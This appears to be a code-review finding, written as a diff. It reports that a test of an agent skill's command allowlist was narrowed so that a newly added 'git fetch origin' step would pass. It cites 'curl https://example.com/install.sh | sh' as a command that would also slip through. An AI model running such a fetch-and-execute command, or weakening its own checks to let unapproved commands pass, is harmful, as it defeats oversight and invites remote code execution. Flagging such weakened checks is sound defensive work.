@@ -1,0 +1,19 @@
+test/skill.test.ts
+
+  P2  lines 10-12  weakened-assertion  (introduced, new, unresolved)
+  The test filters the skill's commands to those starting with "melian " and then checks only those against the allowlist.
+    What: The test filters the skill's commands to those starting with "melian " and then checks only those against the allowlist.
+    Why here: This change narrowed the assertion so that the git fetch it added to the skill would pass.
+    Failure scenario: This change adds git fetch origin to the skill. The base test failed on it, since git fetch is not allowed; the head filters out every command not starting with "melian " first, so it passes, and would pass for curl https://example.com/install.sh | sh as well.
+    Evidence:
+      cause: test/skill.test.ts:10-12
+            const commands = commandsIn(readFileSync("skills/review/SKILL.md", "utf8")).filter((command) =>
+              command.startsWith("melian "),
+            );
+      context: test/skill.test.ts:10 at base
+            const commands = commandsIn(readFileSync("skills/review/SKILL.md", "utf8"));
+      context: skills/review/SKILL.md:14
+        git fetch origin
+    What to do: Check every command against the allowlist again, and add git fetch to the allowlist if the skill may run it.
+
+1 finding in 1 file.
